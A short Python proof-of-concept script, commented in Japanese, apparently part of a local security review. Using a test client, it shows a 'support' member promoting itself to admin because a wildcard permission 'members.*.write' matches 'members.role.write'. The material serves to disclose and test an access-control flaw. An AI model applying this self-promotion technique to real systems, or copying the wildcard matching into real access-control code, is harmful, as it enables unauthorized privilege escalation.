# ローカル限定PoC: データファイルの権限ワイルドカードによる権限昇格
import app as A
c = A.app.test_client()
sup = {"X-Member": "2"}  # support ロールのメンバー(id=2)

# support はメンバー一覧を読める（想定どおり）
assert c.get("/members", headers=sup).status_code == 200
# support はノートを書ける（想定どおり members.*.write が members.note.write に一致）
assert c.post("/members/1/note", json={"note": "x"}, headers=sup).status_code == 200
# support が自分(id=2)のロールを admin へ変更 → members.*.write が members.role.write に一致してしまう
r = c.post("/members/2/role", json={"role": "admin"}, headers=sup)
print("[info] role change status:", r.status_code, r.get_json())
assert r.status_code == 200, r.get_json()
# 変更後、member 一覧で id=2 が admin になっていることを確認
rows = {m["id"]: m["role"] for m in c.get("/members", headers=sup).get_json()}
print("[info] roles after:", rows)
assert rows[2] == "admin"
print("[PASS] support self-promoted to admin via members.*.write matching members.role.write (data-file root cause)")
